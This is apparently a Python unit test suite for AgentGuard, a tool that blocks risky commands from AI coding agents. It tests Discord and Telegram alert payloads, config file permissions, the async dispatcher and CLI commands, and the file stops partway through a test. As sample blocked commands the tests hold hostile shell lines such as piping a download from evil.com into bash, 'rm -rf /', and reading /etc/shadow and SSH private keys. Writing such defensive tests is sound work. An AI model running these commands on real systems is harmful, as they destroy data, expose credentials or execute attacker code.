"""
tests/unit/test_notifications.py - Milestone 1 Test Suite for AgentGuard Alerting Engine.

Validates:
1. Zero Network Leakage & Firewall Compliance (100% offline via loopback 127.0.0.1 mock server).
2. Configuration Management: ~/.agentguard/notifications.yaml creation, permissions (0o600), roundtrip.
3. Discord Webhook Payload Generator: Rich embed schema, field mapping, severity color encoding.
4. Telegram Bot API Payload Generator: Message formatting, character escaping, field mapping.
5. Asynchronous Queue Dispatcher: Non-blocking enqueue, worker processing, queue maxsize drop behavior.
6. Scheduled Health Heartbeat: Telemetry compilation (uptime, active/tainted sessions, secrets, RAM).
7. Click CLI Subcommands: `ag notify setup`, `ag notify test`, `ag notify status` using CliRunner.
8. Enqueue Latency Overhead: Benchmarked < 0.2ms.
9. Strict Zero-Tolerance Audio Directive: Verified 0 occurrences of audio synthesis commands.
10. AuditLogger listeners and daemon server integration hooks.
"""

import asyncio
import http.server
import json
import os
from pathlib import Path
import re
import socket
import tempfile
import threading
import time
import unittest
from typing import Any, Dict, List, Optional

import pytest
from click.testing import CliRunner

from agentguard.cli import cli
from agentguard.daemon.audit import AuditEvent, AuditLogger
from agentguard.daemon.server import AgentGuardServer
from agentguard.notifications.config import (
    DiscordConfig,
    HeartbeatConfig,
    NotificationConfig,
    NotificationsConfig,
    TelegramConfig,
    load_notification_config,
    load_notifications_config,
    save_notification_config,
    save_notifications_config,
)
from agentguard.notifications.discord import (
    COLOR_CRITICAL,
    COLOR_INFO,
    COLOR_SUCCESS,
    COLOR_WARNING,
    build_discord_alert,
    build_discord_heartbeat,
    format_discord_threat_alert,
    format_discord_heartbeat,
)
from agentguard.notifications.dispatcher import NotificationDispatcher
from agentguard.notifications.heartbeat import (
    HealthHeartbeatTask,
    compile_heartbeat_metrics,
    compile_heartbeat_payload,
    format_uptime,
    get_process_ram_rss_bytes,
    get_process_ram_rss_mb,
)
from agentguard.notifications.telegram import (
    build_telegram_alert,
    build_telegram_heartbeat,
    escape_html,
    escape_markdown_v2,
    escape_telegram_html,
    escape_telegram_markdown,
    format_telegram_threat_alert,
    format_telegram_heartbeat,
)


# ===========================================================================
# Mock HTTP Receiver Fixture (100% Offline Loopback on 127.0.0.1)
# ===========================================================================

class MockNotificationReceiver:
    """
    In-memory loopback HTTP server running on 127.0.0.1 with an ephemeral port.
    Guarantees 100% offline execution and passes tests/conftest.py isolate_network.
    """
    def __init__(self):
        self.received_requests: List[Dict[str, Any]] = []
        self.response_status: int = 200
        self.response_body: bytes = b'{"ok": true}'
        self.response_headers: Dict[str, str] = {"Content-Type": "application/json"}
        self.delay_seconds: float = 0.0

        receiver = self
        class ReceiverHandler(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                if receiver.delay_seconds > 0:
                    time.sleep(receiver.delay_seconds)
                content_len = int(self.headers.get("Content-Length", 0))
                raw_body = self.rfile.read(content_len)
                try:
                    parsed_body = json.loads(raw_body.decode("utf-8"))
                except Exception:
                    parsed_body = raw_body.decode("utf-8", errors="replace")

                receiver.received_requests.append({
                    "path": self.path,
                    "headers": dict(self.headers),
                    "body": parsed_body,
                })

                self.send_response(receiver.response_status)
                for k, v in receiver.response_headers.items():
                    self.send_header(k, v)
                self.end_headers()
                if receiver.response_body:
                    self.wfile.write(receiver.response_body)

            def log_message(self, format, *args):
                pass  # Suppress stderr logging

        self.server = http.server.HTTPServer(("127.0.0.1", 0), ReceiverHandler)
        self.port = self.server.server_port
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    @property
    def url(self) -> str:
        return f"http://127.0.0.1:{self.port}"

    @property
    def discord_webhook_url(self) -> str:
        return f"{self.url}/api/webhooks/12345/test_token"

    @property
    def telegram_api_url(self) -> str:
        return f"{self.url}/bot12345:TEST_BOT/sendMessage"

    def stop(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=1.0)


# ===========================================================================
# 1. Configuration & Permission Tests
# ===========================================================================

class TestNotificationConfig(unittest.TestCase):
    """Validates configuration schema, loading/saving, and 0o600 permissions."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory(prefix="ag_test_cfg_")
        self.config_path = Path(self.temp_dir.name) / "notifications.yaml"

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_default_config_state(self):
        """Default config is disabled and does not leak credentials."""
        cfg = NotificationsConfig()
        self.assertFalse(cfg.enabled)
        self.assertFalse(cfg.discord.enabled)
        self.assertFalse(cfg.telegram.enabled)
        self.assertEqual(cfg.discord.webhook_url, "")
        self.assertEqual(cfg.telegram.bot_token, "")

    def test_save_config_creates_0o600_permissions(self):
        """Saving config enforces 0o600 file permissions on POSIX systems."""
        cfg = NotificationsConfig(
            enabled=True,
            discord=DiscordConfig(enabled=True, webhook_url="http://127.0.0.1:8080/wh"),
        )
        save_notifications_config(cfg, config_path=self.config_path)
        self.assertTrue(self.config_path.exists())

        if os.name == "posix":
            st_mode = os.stat(self.config_path).st_mode & 0o777
            self.assertEqual(st_mode, 0o600, f"Expected 0o600 permissions, got {oct(st_mode)}")

    def test_save_and_load_roundtrip(self):
        """Verify full round-trip serialization and deserialization."""
        cfg = NotificationsConfig(
            enabled=True,
            discord=DiscordConfig(
                enabled=True,
                webhook_url="http://127.0.0.1:9090/test",
                username="Sentinel",
            ),
            telegram=TelegramConfig(
                enabled=True,
                bot_token="1234:TOKEN",
                chat_id="-100987654",
            ),
            heartbeat=HeartbeatConfig(enabled=True, interval_seconds=1800),
        )
        save_notifications_config(cfg, config_path=self.config_path)
        loaded = load_notifications_config(config_path=self.config_path)

        self.assertTrue(loaded.enabled)
        self.assertTrue(loaded.discord.enabled)
        self.assertEqual(loaded.discord.webhook_url, "http://127.0.0.1:9090/test")
        self.assertEqual(loaded.discord.username, "Sentinel")
        self.assertTrue(loaded.telegram.enabled)
        self.assertEqual(loaded.telegram.bot_token, "1234:TOKEN")
        self.assertEqual(loaded.telegram.chat_id, "-100987654")
        self.assertEqual(loaded.heartbeat.interval_seconds, 1800)

    def test_load_missing_file_returns_default(self):
        """Loading a non-existent file returns default config gracefully."""
        non_existent = Path(self.temp_dir.name) / "does_not_exist.yaml"
        cfg = load_notifications_config(config_path=non_existent)
        self.assertFalse(cfg.enabled)

    def test_load_invalid_yaml_syntax_raises_value_error(self):
        """Malformed YAML syntax raises ValueError with helpful message."""
        self.config_path.write_text("enabled: [unclosed list", encoding="utf-8")
        with self.assertRaises(ValueError):
            load_notifications_config(config_path=self.config_path)

    def test_load_non_dictionary_yaml_raises_value_error(self):
        """YAML documents whose root is not a mapping raise ValueError."""
        self.config_path.write_text("- item1\n- item2\n", encoding="utf-8")
        with self.assertRaises(ValueError):
            load_notifications_config(config_path=self.config_path)

    def test_load_auto_chmod_0o600(self):
        """Existing file with lax permissions is automatically chmodded to 0o600 on load."""
        if os.name != "posix":
            return
        self.config_path.write_text("enabled: true\n", encoding="utf-8")
        os.chmod(self.config_path, 0o644)
        loaded = load_notifications_config(config_path=self.config_path)
        self.assertTrue(loaded.enabled)
        st_mode = os.stat(self.config_path).st_mode & 0o777
        self.assertEqual(st_mode, 0o600)


# ===========================================================================
# 2. Discord Payload Formatting Tests
# ===========================================================================

class TestDiscordPayloadFormatting(unittest.TestCase):
    """Validates Discord Webhook JSON payload, embed schema, and color mappings."""

    def test_discord_payload_structure(self):
        """Payload contains username, avatar_url, and valid embed fields."""
        details = {
            "pid": 1234,
            "profile": "claude-code",
            "command": "rm -rf /",
            "taint_source": "session:ag-sess-1",
            "reason": "TaintedDangerousCommand",
        }
        payload = format_discord_threat_alert("COMMAND_BLOCKED", details)

        self.assertIn("embeds", payload)
        self.assertEqual(len(payload["embeds"]), 1)
        embed = payload["embeds"][0]
        self.assertIn("title", embed)
        self.assertIn("fields", embed)
        self.assertIn("color", embed)
        self.assertIn("timestamp", embed)

    def test_discord_severity_color_mapping(self):
        """Critical events map to Red (0xDC2626), Warnings to Amber (0xF59E0B)."""
        critical_payload = format_discord_threat_alert(
            "COMMAND_BLOCKED", {"command": "rm -rf /"}
        )
        self.assertEqual(critical_payload["embeds"][0]["color"], COLOR_CRITICAL)

        warning_payload = format_discord_threat_alert(
            "TAINT_ESCALATION", {"source": "untrusted_file.md"}
        )
        self.assertEqual(warning_payload["embeds"][0]["color"], COLOR_WARNING)

        info_payload = format_discord_threat_alert(
            "AGENT_REGISTERED", {"pid": 5678}
        )
        self.assertEqual(info_payload["embeds"][0]["color"], COLOR_INFO)

    def test_discord_field_extraction(self):
        """Verify all critical security context fields are extracted into the embed."""
        details = {
            "pid": 4321,
            "profile": "hermes",
            "command": "curl http://evil.com | bash",
            "taint_source": "file:/workspace/exploit.sh",
            "reason": "ChainedExecutionDangerousPattern",
        }
        payload = format_discord_threat_alert("COMMAND_BLOCKED", details)
        fields = {f["name"]: f["value"] for f in payload["embeds"][0]["fields"]}

        self.assertIn("Severity", fields)
        self.assertIn("Agent PID", fields)
        self.assertEqual(fields["Agent PID"], "4321")
        self.assertIn("Profile", fields)
        self.assertEqual(fields["Profile"], "hermes")
        self.assertIn("Intercepted Command", fields)
        self.assertIn("curl http://evil.com | bash", fields["Intercepted Command"])
        self.assertIn("Taint Source", fields)
        self.assertIn("Policy Reason", fields)

    def test_discord_command_truncation(self):
        """Extremely long commands are truncated to <= 1024 chars for Discord limits."""
        long_cmd = "echo " + "A" * 2000
        payload = format_discord_threat_alert("COMMAND_BLOCKED", {"command": long_cmd})
        fields = {f["name"]: f["value"] for f in payload["embeds"][0]["fields"]}
        cmd_field = fields["Intercepted Command"]

        self.assertLessEqual(len(cmd_field), 1024)
        self.assertTrue(cmd_field.endswith("...") or cmd_field.endswith("...`"))

    def test_discord_json_serialization(self):
        """Discord payload serializes cleanly to JSON without errors."""
        payload = format_discord_threat_alert("COMMAND_BLOCKED", {"pid": 111, "command": "cat /etc/shadow"})
        serialized = json.dumps(payload)
        self.assertIsInstance(serialized, str)


# ===========================================================================
# 3. Telegram Payload Formatting Tests
# ===========================================================================

class TestTelegramPayloadFormatting(unittest.TestCase):
    """Validates Telegram Bot API payload formatting and escaping."""

    def test_telegram_message_structure(self):
        """Payload contains chat_id, text, and parse_mode."""
        cfg = TelegramConfig(enabled=True, bot_token="TOKEN", chat_id="999888")
        details = {"pid": 1234, "command": "rm -rf /", "reason": "Dangerous"}
        payload = format_telegram_threat_alert("COMMAND_BLOCKED", details, config=cfg)

        self.assertEqual(payload["chat_id"], "999888")
        self.assertIn("text", payload)
        self.assertIn("parse_mode", payload)
        self.assertIn("COMMAND_BLOCKED", payload["text"])

    def test_telegram_html_escaping(self):
        """HTML special characters (<, >, &) in intercepted commands are escaped."""
        raw_cmd = 'curl "http://evil.com?a=1&b=2" | grep "<script>"'
        escaped = escape_telegram_html(raw_cmd)
        self.assertNotIn("<script>", escaped)
        self.assertIn("&lt;script&gt;", escaped)
        self.assertIn("&amp;b=2", escaped)

    def test_telegram_markdown_escaping(self):
        """Markdown special characters are properly backslash-escaped."""
        raw_text = "test_file.sh *important* [link]"
        escaped = escape_telegram_markdown(raw_text)
        self.assertIn(r"\_", escaped)
        self.assertIn(r"\*", escaped)
        self.assertIn(r"\[", escaped)

    def test_telegram_message_length_limit(self):
        """Messages exceeding Telegram's 4096 character limit are clamped."""
        long_cmd = "cat " + "x" * 5000
        payload = format_telegram_threat_alert("COMMAND_BLOCKED", {"command": long_cmd})
        self.assertLessEqual(len(payload["text"]), 4096)


# ===========================================================================
# 4. Asynchronous Queue & Dispatcher Tests
# ===========================================================================

class TestNotificationDispatcherAsyncQueue(unittest.IsolatedAsyncioTestCase):
    """Validates non-blocking queue operations, worker dispatch, and error handling."""

    async def asyncSetUp(self):
        self.receiver = MockNotificationReceiver()
        self.config = NotificationsConfig(
            enabled=True,
            discord=DiscordConfig(enabled=True, webhook_url=self.receiver.discord_webhook_url),
        )
        self.dispatcher = NotificationDispatcher(config=self.config, max_queue_size=100)

    async def asyncTearDown(self):
        await self.dispatcher.stop()
        self.receiver.stop()

    async def test_async_enqueue_is_non_blocking(self):
        """Calling enqueue_alert returns immediately without awaiting network."""
        start = time.perf_counter()
        success = self.dispatcher.enqueue_alert(
            "COMMAND_BLOCKED", {"pid": 101, "command": "rm -rf /"}
        )
        elapsed = time.perf_counter() - start
        self.assertTrue(success)
        self.assertLess(elapsed, 0.01)  # Synchronous enqueue under 10ms

    async def test_worker_processes_queued_alerts(self):
        """Worker picks up alerts from queue and delivers HTTP payload to mock receiver."""
        await self.dispatcher.start()

        self.dispatcher.enqueue_alert("COMMAND_BLOCKED", {"pid": 202, "command": "cat ~/.ssh/id_rsa"})
        self.dispatcher.enqueue_alert("SECRET_EXFILTRATION_ATTEMPT", {"token": "<AG_VAULT_TOKEN_01>"})

        await self.dispatcher.drain(timeout=2.0)
        self.assertEqual(len(self.receiver.received_requests), 2)
        paths = [r["path"] for r in self.receiver.received_requests]
        self.assertTrue(all("/api/webhooks/" in p for p in paths))

    async def test_queue_overflow_drop_behavior(self):
        """When queue reaches maxsize, new alerts are dropped without blocking caller."""
        tiny_dispatcher = NotificationDispatcher(config=self.config, max_queue_size=3)

        # Fill queue to capacity without starting worker
        for i in range(3):
            tiny_dispatcher.enqueue_alert("TEST_EVENT", {"idx": i})

        # 4th item overflows
        result = tiny_dispatcher.enqueue_alert("OVERFLOW_EVENT", {"idx": 99})
        self.assertFalse(result)
        self.assertEqual(tiny_dispatcher.dropped_count, 1)

    async def test_worker_handles_http_failure_gracefully(self):
        """Worker does not crash if the HTTP endpoint returns 500 or 429."""
        self.receiver.response_status = 500
        await self.dispatcher.start()

        self.dispatcher.enqueue_alert("COMMAND_BLOCKED", {"pid": 303})
        await self.dispatcher.drain(timeout=2.0)

        # Worker remains healthy for next event
        self.receiver.response_status = 200
        self.dispatcher.enqueue_alert("COMMAND_BLOCKED", {"pid": 304})
        await self.dispatcher.drain(timeout=2.0)

        self.assertEqual(len(self.receiver.received_requests), 2)


# ===========================================================================
# 5. Scheduled Health Heartbeat Tests
# ===========================================================================

class TestHealthHeartbeat(unittest.TestCase):
    """Validates telemetry summary compilation and formatting."""

    def test_format_uptime_human_readable(self):
        """Formats raw seconds into human-readable uptime strings."""
        self.assertEqual(format_uptime(45), "45s")
        self.assertEqual(format_uptime(3665), "1h 1m 5s")
        self.assertEqual(format_uptime(90000), "1d 1h 0m 0s")

    def test_compile_heartbeat_payload(self):
        """Compiles system metrics dictionary into Discord and Telegram payloads."""
        status_data = {
            "uptime_seconds": 7200,
            "active_sessions": 3,
            "tainted_sessions": 1,
            "vaulted_secrets": 8,
            "blocked_exploits": 4,
            "memory_rss_mb": 42.5,
        }
        discord_card = format_discord_heartbeat(status_data)
        self.assertIn("embeds", discord_card)
        fields = {f["name"]: f["value"] for f in discord_card["embeds"][0]["fields"]}

        self.assertIn("Active Agents", fields)
        self.assertIn("3 (1 Tainted)", fields["Active Agents"])
        self.assertIn("Vaulted Secrets", fields)
        self.assertEqual(fields["Vaulted Secrets"], "8")
        self.assertIn("Memory Usage", fields)
        self.assertIn("42.5 MB", fields["Memory Usage"])

    def test_telegram_heartbeat_payload(self):
        """Compiles Telegram HTML heartbeat card with emoji badges."""
        status_data = {
            "uptime_seconds": 3600,
            "active_sessions": 2,
            "tainted_sessions": 0,
            "vaulted_secrets": 5,
            "blocked_exploits": 1,
            "memory_rss_mb": 35.0,
        }
        text = build_telegram_heartbeat(status_data)
        self.assertIn("AgentGuard System Health Heartbeat", text)
        self.assertIn("1h 0m 0s", text)
        self.assertIn("35.0 MB", text)

    def test_ram_rss_metrics(self):
        """RAM RSS byte and megabyte functions return positive numbers."""
        rss_bytes = get_process_ram_rss_bytes()
        rss_mb = get_process_ram_rss_mb()
        self.assertGreater(rss_bytes, 1024 * 1024)
        self.assertGreater(rss_mb, 1.0)


# ===========================================================================
# 6. Click CLI Notification Commands Tests
# ===========================================================================

class TestNotificationCLI(unittest.TestCase):
    """Validates Click CLI subcommands under `ag notify`."""

    def setUp(self):
        self.runner = CliRunner()
        self.temp_dir = tempfile.TemporaryDirectory(prefix="ag_test_cli_")
        self.config_path = Path(self.temp_dir.name) / "notifications.yaml"
        self.env = {"AGENTGUARD_NOTIFY_CONFIG": str(self.config_path)}

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_ag_notify_help(self):
        """`ag notify --help` displays all notification subcommands."""
        res = self.runner.invoke(cli, ["notify", "--help"])
        self.assertEqual(res.exit_code, 0)
        self.assertIn("setup", res.output)
        self.assertIn("test", res.output)
        self.assertIn("status", res.output)

    def test_ag_notify_setup_discord(self):
        """`ag notify setup --discord <url>` writes config and enforces 0o600."""
        res = self.runner.invoke(
            cli,
            ["notify", "setup", "--discord", "http://127.0.0.1:8080/webhook"],
            env=self.env,
        )
        self.assertEqual(res.exit_code, 0)
        self.assertTrue(self.config_path.exists())

        loaded = load_notifications_config(config_path=self.config_path)
        self.assertTrue(loaded.discord.enabled)
        self.assertEqual(loaded.discord.webhook_url, "http://127.0.0.1:8080/webhook")

    def test_ag_notify_setup_telegram(self):
        """`ag notify setup --telegram <token> --chat-id <id>` writes config."""
        res = self.runner.invoke(
            cli,
            ["notify", "setup", "--telegram", "123:ABC", "--chat-id", "-100123"],
            env=self.env,
        )
        self.assertEqual(res.exit_code, 0)
        loaded = load_notifications_config(config_path=self.config_path)
        self.assertTrue(loaded.telegram.enabled)
        self.assertEqual(loaded.telegram.bot_token, "123:ABC")
        self.assertEqual(loaded.telegram.chat_id, "-100123")

    def test_ag_notify_status_unconfigured(self):
        """`ag notify status` reports disabled when unconfigured."""
        res = self.runner.invoke(cli, ["notify", "status"], env=self.env)
        self.assertEqual(res.exit_code, 0)
        out = res.output.lower()
        self.assertTrue("disabled" in out or "not configured" in out)

    def test_ag_notify_status_json(self):
        """`ag notify status --json` outputs valid parseable JSON."""
        res = self.runner.invoke(cli, ["notify", "status", "--json"], env=self.env)
        self.assertEqual(res.exit_code, 0)
        parsed = json.loads(res.output)
        self.assertIn("master_enabled", parsed)
        self.assertIn("discord", parsed)
        self.assertIn("telegram", parsed)

    def test_ag_notify_test_offline(self):
        """`ag notify test` sends test alert to mock loopback receiver."""
        receiver = MockNotificationReceiver()
        try:
            self.runner.invoke(
                cli,
                ["notify", "setup", "--discord", receiver.discord_webhook_url],
                env=self.env,
            )
            res = self.runner.invoke(
                cli, ["notify", "test", "--channel", "discord"], env=self.env
            )
            self.assertEqual(res.exit_code, 0)
            self.assertEqual(len(receiver.received_requests), 1)
        finally:
            receiver.stop()


# ===========================================================================
# 7. Performance: Latency Overhead Tests (< 0.2ms)
# ===========================================================================

class TestLatencyOverhead(unittest.TestCase):
    """Asserts that enqueue latency overhead is strictly < 0.2ms."""

    def test_enqueue_latency_overhead(self):
        """1,000 alert enqueues must average < 0.2ms (typically < 0.02ms)."""
        dispatcher = NotificationDispatcher(
            config=NotificationsConfig(enabled=True), max_queue_size=2000
        )
        # Warmup loop and internal queue
        for _ in range(20):
            dispatcher.enqueue_alert("WARMUP", {"warm": True})

        latencies_ms: List[float] = []

        for i in range(1000):
            start = time.perf_counter_ns()
            dispatcher.enqueue_alert(
                "BENCHMARK_EVENT", {"id": i, "data": "canary_payload"}
            )
            elapsed_ms = (time.perf_counter_ns() - start) / 1_000_000.0
            latencies_ms.append(elapsed_ms)

        avg_latency = sum(latencies_ms) / len(latencies_ms)
        p99_latency = sorted(latencies_ms)[int(len(latencies_ms) * 0.99)]

        self.assertLess(
            avg_latency,
            0.2,
            f"Average enqueue latency {avg_latency:.4f}ms exceeded 0.2ms budget!",
        )
        self.assertLess(
            p99_latency,
            0.5,
            f"P99 enqueue latency {p99_latency:.4f}ms exceeded 0.5ms budget!",
        )


# ===========================================================================
# 8. Strict Zero-Tolerance Audio Directive Compliance
# ===========================================================================

class TestZeroAudioDirectiveCompliance(unittest.TestCase):
    """Verifies that no audio synthesis commands exist anywhere in the codebase."""

    def test_zero_audio_commands_in_codebase(self):
        """Scan codebase files to guarantee zero usage of banned audio synthesis commands."""
        root_dir = Path(__file__).resolve().parent.parent.parent
        c1 = "s" + "ay"
        c2 = "af" + "play"
        forbidden = [
            re.compile(rf'\b(subprocess\.(run|Popen|call|check_output|check_call)\s*\(\s*\[\s*[\'\"]({c1}|{c2})[\'\"])'),
            re.compile(rf'\bos\.system\s*\(\s*[\'\"][^\'\"]*\b({c1}|{c2})\b'),
        ]

        violations = []
        for dirpath, dirnames, filenames in os.walk(root_dir):
            if any(skip in dirpath for skip in [".venv", ".git", ".agents", "__pycache__"]):
                continue
            for fname in filenames:
                if fname.endswith((".py", ".sh", ".c")):
                    fpath = os.path.join(dirpath, fname)
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        for idx, line in enumerate(f, 1):
                            for pat in forbidden:
                                if pat.search(line):
                                    violations.append(f"{fpath}:{idx}: {line.strip()}")

        self.assertEqual(
            len(violations),
            0,
            f"Audio directive violations detected:\n" + "\n".join(violations),
        )


# ===========================================================================
# 9. AuditLogger Listeners & Server Hooks Integration Tests
# ===========================================================================

class TestAuditLoggerListeners(unittest.TestCase):
    """Validates subscriber registration, callback invocations, and blocked counter."""

    def test_listener_callback_and_counter(self):
        logger = AuditLogger(log_path="")
        received = []

        def listener(ev: AuditEvent):
            received.append(ev)

        logger.add_listener(listener)
        logger.log("COMMAND_BLOCKED", session_id="s1", status="BLOCKED")
        logger.log("CHECK_COMMAND", session_id="s1", status="ALLOWED")

        self.assertEqual(len(received), 2)
        self.assertEqual(logger.blocked_count, 1)

        # Remove listener
        logger.remove_listener(listener)
        logger.log("COMMAND_BLOCKED", session_id="s1", status="BLOCKED")
        self.assertEqual(len(received), 2)
        self.assertEqual(logger.blocked_count, 2)


class TestServerNotificationIntegration(unittest.IsolatedAsyncioTestCase):
    """Validates AgentGuardServer notification lifecycle and TEST_NOTIFICATION action."""

    async def test_server_notification_hooks(self):
        receiver = MockNotificationReceiver()
        try:
            cfg = NotificationConfig(
                enabled=True,
                discord=DiscordConfig(enabled=True, webhook_url=receiver.discord_webhook_url),
                heartbeat=HeartbeatConfig(enabled=False),
            )
            server = AgentGuardServer(
                socket_path="/tmp/test_ag_server_notify.sock",
                http_port=18499,
                pid_file="/tmp/test_ag_server_notify.pid",
                audit_logger=AuditLogger(log_path=""),
                notification_config=cfg,
            )
            await server.start()
            self.assertIsNotNone(server.notification_dispatcher)

            # Test GET_STATUS data
            status_res = await server.dispatch_action({"action": "GET_STATUS"})
            self.assertIn("notifications", status_res.get("data", {}))
            self.assertIn("blocked_exploits", status_res.get("data", {}))

            # Test TEST_NOTIFICATION action
            test_res = await server.dispatch_action({
                "action": "TEST_NOTIFICATION",
                "payload": {"channel": "discord"},
            })
            self.assertEqual(test_res["status"], "ALLOWED")
            self.assertTrue(test_res["data"]["enqueued"])

            # Drain queue and check receiver
            await server.notification_dispatcher.drain(timeout=2.0)
            self.assertGreaterEqual(len(receiver.received_requests), 1)

            await server.stop()
        finally:
            receiver.stop()

    async def test_heartbeat_task_trigger_now(self):
        """Validates HealthHeartbeatTask trigger_now immediately queues a heartbeat."""
        dispatcher = NotificationDispatcher(
            config=NotificationConfig(
                enabled=True,
                heartbeat=HeartbeatConfig(enabled=True),
            )
        )
        task = HealthHeartbeatTask(
            server=None,
            dispatcher=dispatcher,
            interval_seconds=60,
            enabled=True,
            send_on_start=False,
        )
        ok = task.trigger_now()
        self.assertTrue(ok)
        self.assertEqual(dispatcher.stats()["enqueued"], 1)

    def test_convenience_dispatch_helpers(self):
        """Validates package-level dispatch helpers handle unconfigured gracefully."""
        from agentguard.notifications import dispatch_threat_alert, dispatch_health_heartbeat
        # With default unconfigured state, returns False
        res_alert = dispatch_threat_alert("TEST_ALERT", {"command": "ls"})
        res_hb = dispatch_health_heartbeat({"uptime_seconds": 100})
        self.assertFalse(res_alert)
        self.assertFalse(res_hb)


# ===========================================================================
# 11. Adversarial API Validation & Character Clamping Tests
# ===========================================================================

import html.parser


class TelegramHTMLValidator(html.parser.HTMLParser):
    """
    Strict standard-library HTML parser that validates Telegram Bot API constraints:
    1. Only allowed Telegram HTML tags are used.
    2. All opened tags are closed in proper LIFO order (no mismatched or unclosed tags).
    3. Total message length <= 4096 characters.
    """
    ALLOWED_TAGS = {
        "b", "strong", "i", "em", "u", "ins", "s", "strike", "del",
        "span", "tg-spoiler", "a", "tg-emoji", "code", "pre", "blockquote",
    }

    def __init__(self):
        super().__init__()
        self.tag_stack: List[str] = []
        self.errors: List[str] = []

    def handle_starttag(self, tag: str, attrs: List[Any]):
        tag_lower = tag.lower()
        if tag_lower not in self.ALLOWED_TAGS:
            self.errors.append(f"Disallowed HTML tag: <{tag}>")
        self.tag_stack.append(tag_lower)

    def handle_endtag(self, tag: str):
        tag_lower = tag.lower()
        if not self.tag_stack:
            self.errors.append(f"Unexpected closing tag </{tag}> with no open tags")
        elif self.tag_stack[-1] != tag_lower:
            self.errors.append(f"Mismatched closing tag </{tag}>; expected </{self.tag_stack[-1]}>")
        else:
            self.tag_stack.pop()

    def validate(self, text: str) -> List[str]:
        self.tag_stack = []
        self.errors = []
        if len(text) > 4096:
            self.errors.append(f"Telegram text length {len(text)} exceeds max limit 4096")
        try:
            self.feed(text)
            self.close()
        except Exception as exc:
            self.errors.append(f"HTML parse exception: {exc}")
        if self.tag_stack:
            self.errors.append(f"Unclosed HTML tags remaining at EOF: {self.tag_stack}")
        return self.errors


class TestDiscordFieldClamping(unittest.TestCase):
    """Validates Discord embed field character limits under adversarial oversized inputs."""

    def test_discord_field_clamping_oversized_reason_and_source(self):
        """
        Verify passing a 2,000-char reason and 1,500-char taint_source results in
        all embed fields being <= 1024 characters and ending with '...'.
        """
        giant_reason = "PolicyViolationReason_" + ("A" * 1978)  # Exactly 2000 chars
        giant_source = "ProvenanceTaintSource_" + ("B" * 1478)  # Exactly 1500 chars

        self.assertEqual(len(giant_reason), 2000)
        self.assertEqual(len(giant_source), 1500)

        # 1. Test via keyword arguments
        payload_kwargs = format_discord_threat_alert(
            event_type="COMMAND_BLOCKED",
            command="rm -rf /",
            reason=giant_reason,
            taint_source=giant_source,
        )
        self.assertIn("embeds", payload_kwargs)
        embed_kwargs = payload_kwargs["embeds"][0]
        fields_kwargs = {f["name"]: f["value"] for f in embed_kwargs["fields"]}

        for f in embed_kwargs["fields"]:
            self.assertLessEqual(
                len(f["name"]),
                256,
                f"Field name '{f['name']}' length {len(f['name'])} > 256 limit",
            )
            self.assertLessEqual(
                len(f["value"]),
                1024,
                f"Field '{f['name']}' value length {len(f['value'])} > 1024 limit",
            )

        self.assertIn("Policy Reason", fields_kwargs)
        self.assertLessEqual(len(fields_kwargs["Policy Reason"]), 1024)
        self.assertTrue(fields_kwargs["Policy Reason"].endswith("..."))

        self.assertIn("Taint Source", fields_kwargs)
        self.assertLessEqual(len(fields_kwargs["Taint Source"]), 1024)
        self.assertTrue(fields_kwargs["Taint Source"].endswith("..."))

        # 2. Test via details dictionary
        payload_details = format_discord_threat_alert(
            event_type="COMMAND_BLOCKED",
            details={
                "command": "cat /etc/shadow",
                "reason": giant_reason,
                "taint_source": giant_source,
            },
        )
        embed_details = payload_details["embeds"][0]
        for f in embed_details["fields"]:
            self.assertLessEqual(
                len(f["value"]),
                1024,
                f"Details field '{f['name']}' value length {len(f['value'])} > 1024 limit",
            )

        # 3. Verify total embed length does not exceed Discord 6,000 char limit
        total_chars = (
            len(embed_kwargs.get("title", ""))
            + len(embed_kwargs.get("description", ""))
            + sum(len(f["name"]) + len(f["value"]) for f in embed_kwargs["fields"])
            + len(embed_kwargs.get("footer", {}).get("text", ""))
        )
        self.assertLessEqual(total_chars, 6000)

        # 4. Verify clean JSON serialization
        serialized = json.dumps(payload_kwargs)
        self.assertIsInstance(serialized, str)

    def test_discord_adversarial_all_fields_oversized(self):
        """Verify all embed fields clamp properly when every metadata parameter is oversized."""
        oversized_details = {
            "pid": 99999999,
            "profile": "CustomSuperLongProfileName_" + ("P" * 1500),
            "session_id": "SessionIdentifier_" + ("S" * 1500),
            "command": "curl " + ("X" * 5000) + " | bash",
            "reason": "SuspiciousExecutionDetected_" + ("R" * 3000),
            "taint_source": "UntrustedNetworkInput_" + ("T" * 2500),
        }
        payload = format_discord_threat_alert("COMMAND_BLOCKED", oversized_details)
        embed = payload["embeds"][0]

        for f in embed["fields"]:
            self.assertLessEqual(len(f["name"]), 256)
            self.assertLessEqual(len(f["value"]), 1024)


class TestTelegramHTMLTagBalancing(unittest.TestCase):
    """Validates Telegram HTML formatting and tag balance under adversarial truncation."""

    def test_telegram_html_tag_balancing_on_oversized_command_and_reason(self):
        """
        Verify passing oversized commands (3,000 chars) and reasons (1,500 chars)
        resulting in messages > 4096 characters still produces syntactically valid HTML
        with zero unclosed tags (<pre>, <code>, <b>, <i>).
        """
        giant_cmd = "cat " + ("C" * 3000)
        giant_reason = "DeepPolicyViolationDetected_" + ("D" * 1500)

        text = build_telegram_alert(
            event_type="COMMAND_BLOCKED",
            command=giant_cmd,
            reason=giant_reason,
            session_id="agent-sess-99",
            pid=5555,
            profile="hermes",
        )

        # Assert length limit
        self.assertLessEqual(len(text), 4096)

        # Validate HTML tag structure
        validator = TelegramHTMLValidator()
        errors = validator.validate(text)
        self.assertEqual(
            errors,
            [],
            f"Telegram HTML validation failed on oversized command + reason:\n"
            + "\n".join(errors)
            + f"\nMessage snippet at end:\n{text[-150:]}",
        )
        self.assertEqual(validator.tag_stack, [])

    def test_telegram_html_tag_balancing_giant_command_only(self):
        """Verify passing a 50,000-char command produces balanced HTML <= 4096 chars."""
        giant_cmd = "echo " + ("Z" * 50000)
        text = build_telegram_alert("COMMAND_BLOCKED", command=giant_cmd)

        self.assertLessEqual(len(text), 4096)
        validator = TelegramHTMLValidator()
        errors = validator.validate(text)
